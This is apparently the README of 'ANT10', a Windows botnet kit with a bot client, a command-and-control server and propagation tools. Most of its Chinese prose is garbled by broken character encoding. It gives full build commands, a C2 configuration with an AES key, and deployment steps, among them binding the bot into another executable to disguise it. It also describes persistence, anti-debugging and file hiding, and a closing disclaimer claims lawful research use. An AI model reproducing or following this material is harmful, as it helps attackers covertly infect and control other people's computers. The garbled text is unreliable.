# ANT10 Զ�̹���ϵͳ (ANT10 Remote Management System)

ANT10��һ���߼�Զ�̹���ϵͳ (Advanced Remote Management System)���ṩ��ȫ��Զ������ִ�� (Remote Command Execution) ��ϵͳ��� (System Monitoring) ���ܡ���ϵͳ���ÿͻ���-�������ܹ� (Client-Server Architecture)��ͨ������ͨ�� (Encrypted Communication) ȷ�����ݴ��䰲ȫ��

## ϵͳ�ܹ� (System Architecture)

ANT10ϵͳ��������Ҫ������ɣ�

1. **Bot�ͻ��� (Bot Client)**��������Ŀ��ϵͳ�ϵ��������ͻ���
2. **C2������ (Command & Control Server)**��������������Ʒ�����
3. **ͨ��ģ�� (Communication Module)**���������ͨ�ŵ����
4. **�������� (Propagation Tools)**�����ڲ���ͻ��˵ĸ�������

### ϵͳ����ͼ

```
+-------------+      ����ͨ��      +-------------+
|  Bot�ͻ���  | <----------------> |  C2������   |
+-------------+                    +-------------+
      |                                  |
      | - ִ������                       | - ��������
      | - �ռ�ϵͳ��Ϣ                   | - ����ͻ���
      | - �־û���װ                     | - ������
      |                                  |
```

## ��Ҫ���

### Bot�ͻ��� (Bot Client)

Bot�ͻ����ǲ�����Ŀ��ϵͳ�ϵĺ���������������¹��ܣ�

- **����ִ�� (Command Execution)**��ִ�д�C2���������յ�����
- **ϵͳ��Ϣ�ռ� (System Information Collection)**���ռ�������ϵͳ��Ϣ
- **�־û���װ (Persistence Installation)**��ͨ�����ֻ���ȷ��ϵͳ�������������
- **��ȫ��� (Security Checks)**��ʵ�ַ����Ժͻ�����⹦��
- **����ͨ�� (Encrypted Communication)**��ʹ��AES�����������ͨ��

��Ҫ�ļ���
- `bot/bot.c`�����������
- `bot/command.c`���������
- `bot/persistence.c`���־û���װ����
- `bot/security_checks.c`����ȫ��⹦��
- `bot/network.c`������ͨ�Ź���

### C2������ (Command & Control Server)

��������Ʒ�������ϵͳ���������������������¹��ܣ�

- **Bot���� (Bot Management)**���������ӵ�Bot�ͻ���
- **����ַ� (Command Distribution)**����Bot�ͻ��˷�������
- **������� (Result Processing)**�����ղ�����Bot�ͻ��˷��صĽ��
- **����̨���� (Console UI)**���ṩ����Ա��������

��Ҫ�ļ���
- `c2_server/main.c`��������������
- `c2_server/bot_manager.c`��Bot�ͻ��˹���
- `c2_server/network.c`������ͨ�Ŵ���
- `c2_server/console_ui.c`������̨�û�����
- `c2_server/c2_config.json`�������������ļ�

### ͨ��ģ�� (Communication Module)

ͨ��ģ�鴦��ͻ��˺ͷ�����֮��ļ������ݴ��䣺

- **����ʵ�� (Encryption Implementation)**��AES�����㷨
- **���繤�� (Network Utilities)**�������������Ӻ����ݴ���

��Ҫ�ļ���
- `comm/crypto.c`�����ܹ���ʵ��
- `comm/net_util.c`�����繤�ߺ���

### �������� (Propagation Tools)

�����������ڸ�������Bot�ͻ��ˣ�

- **�ļ������� (File Binder)**���������ִ���ļ�����Ϊһ��
- **��������� (Stub Loader)**���������ļ�����ȡ��ִ�г���

��Ҫ�ļ���
- `prop/binder.c`���ļ�������
- `prop/stubloader.c`�����������

## ��װ��ʹ�� (Installation & Usage)

### ���� (Compilation)

#### ����Bot�ͻ���

```bash
x86_64-w64-mingw32-gcc $(find ./bot ./comm -name '*.c' -not -name '*_test.c') -o bot.exe \
-D_WIN32_WINNT=0x0A00 -DUNICODE -D_UNICODE \
-I/usr/x86_64-w64-mingw32/include \
-I/usr/x86_64-w64-mingw32/include/jansson \
-L/usr/x86_64-w64-mingw32/lib -lshlwapi \
-liphlpapi -ladvapi32 -lws2_32 -lcrypt32 -ljansson -lktmw32 \
-static -Wno-deprecated-declarations -fno-stack-protector -O0
```

#### ����C2������

```bash
x86_64-w64-mingw32-gcc ./c2_server/main.c ./comm/net_util.c ./comm/net_util.h ./c2_server/network.c \
./comm/crypto.c ./comm/crypto.h \
./c2_server/bot_manager.c ./c2_server/config.c ./c2_server/console_ui.c -o c2.exe \
-D_WIN32_WINNT=0x0A00 \
-I/usr/x86_64-w64-mingw32/include \
-L/usr/x86_64-w64-mingw32/lib \
-lws2_32 -ljansson -lkernel32 -ladvapi32 -lntdll \
-static -Wno-deprecated-declarations -fno-stack-protector -O0
```

#### ���봫������

```bash
# �����ļ�������
x86_64-w64-mingw32-gcc ./prop/binder.c -o binder.exe

# ������������
x86_64-w64-mingw32-gcc ./prop/stubloader.c -o stubloader.exe -nostdlib -lkernel32 -luser32 -s -Os -Wl,--entry=_mainCRTStartup
```

### ���� (Configuration)

1. �޸�`c2_server/c2_config.json`�ļ������÷�������
   ```json
   {
     "tls_cert_file": "server.crt",
     "tls_key_file": "server.key",
     "aes_key": "2B7E151628AED2A6ABF7158809CF4F3C",
     "valid_ua": "Mozilla/5.0",
     "api_endpoint": "/api/v1"
   }
   ```

2. ȷ��TLS֤�����Կ�ļ���������ȷλ�á�

### ʹ�� (Usage)

1. **����C2������ (Start C2 Server)**��
   ```
   ./c2_server.exe
   ```

2. **����Bot�ͻ��� (Deploy Bot Client)**��
   - ֱ�����У�`bot.exe`
   - ʹ����������
     ```
     ./binder.exe stubloader.exe bot.exe Ŀ�����.exe ����ļ�.exe
     ```

3. **ͨ��C2����������̨����Bot�ͻ��� (Manage Bot Clients via C2 Console)**��
   - �鿴���ӵĿͻ���
   - ��������
   - �鿴����ִ�н��

## ��ȫע������ (Security Considerations)

1. **����ͨ�� (Encrypted Communication)**������ͨ��ʹ��AES���ܺ�TLS������
2. **�����Ի��� (Anti-Debugging)**��Bot�ͻ��˰��������Թ��ܣ���ֹ������
3. **�־û���װ (Persistence Installation)**��Bot�ͻ���ʹ�ö��ֻ���ȷ���־��ԡ�
4. **�ļ����� (File Protection)**����װ����ļ�ʹ�����غ�ϵͳ���Խ��б�����

## ϵͳҪ�� (System Requirements)

- Windows 10����߰汾 (Windows 10 or later)
- 64λ����ϵͳ (64-bit Operating System)
- ����ԱȨ�ޣ�����ĳЩ���ܣ�(Administrator Privileges for certain features)

## �������� (Disclaimer)

��ϵͳ�����ںϷ���ϵͳ����Ͱ�ȫ�о�Ŀ�ġ�ʹ���߱��������������õķ��ɷ��棬������ʵ�����Ȩ��δ����Ȩ������ϵͳ��ʹ�ñ��������Υ�����ɡ�
